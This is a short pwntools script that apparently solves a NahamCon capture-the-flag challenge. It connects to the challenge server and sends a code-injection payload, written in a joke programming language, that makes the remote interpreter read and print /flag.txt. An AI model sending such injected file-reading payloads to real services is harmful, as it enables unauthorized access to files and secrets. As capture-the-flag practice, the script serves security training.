#!/usr/bin/env python3

from pwn import *

p = remote('challenge.nahamcon.com', 30581)

#  print(open("flag.txt").read())

payload = b'''VISIBLE WIT open WIT "/flag.txt"! OWN read THING !'''


print(p.recvuntil('MAYB I RUN 4 U!').decode(encoding='ascii'))
p.sendline(payload)
print("Flag:", p.recvall().decode(encoding='ascii'))
